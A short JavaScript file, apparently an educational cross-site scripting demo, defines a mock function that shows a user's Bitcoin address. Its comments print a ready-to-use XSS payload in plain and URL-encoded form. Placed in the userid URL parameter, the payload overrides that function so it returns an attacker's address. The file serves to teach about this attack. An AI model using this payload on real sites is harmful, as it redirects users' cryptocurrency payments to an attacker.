/* This script contains code for showing a user's BTC address
*
* Author: Josh McIntyre
*/

// Functions for generating data

/* Generate a mock Bitcoin address for a user's wallet
* A real wallet here  might call out to a server, or generate a keys
* But for this XSS demo, hardcode a sample address
* Warning: Don't use this address for anything! The key is unavailable
*/
function generateAddress(userId)
{
	var address = "1Nzo1mojzMSKpEdWMkusZJd4arcHU6ZeH7";
	
	return address;
}

/* Malicious GET payload for demo:
* 1maliciousaddresskusZJd4arcHU6ZeH7
* 
* The user can set the `userid=` parameter of the URL to this payload to trigger the XSS attack
* Human readable payload:
*
* <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdjYGRg/A8AAQoBAj0TXDIAAAAASUVORK5CYII=" onload="generateAddress = function(userId){return '1maliciousaddresskusZJd4arcHU6ZeH7';}" />
*
* URL encoded payload:
* %3Cimg%20src%3D%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdjYGRg%2FA8AAQoBAj0TXDIAAAAASUVORK5CYII%3D%22%20onload%3D%22generateAddress%20%3D%20function%28userId%29%7Breturn%20%271maliciousaddresskusZJd4arcHU6ZeH7%27%3B%7D%22%20%2F%3E
*
* Placing this payload in the userid field overwrites the real library `generateAddress` function
* with a malicious one that returns the attacker address. 
*/
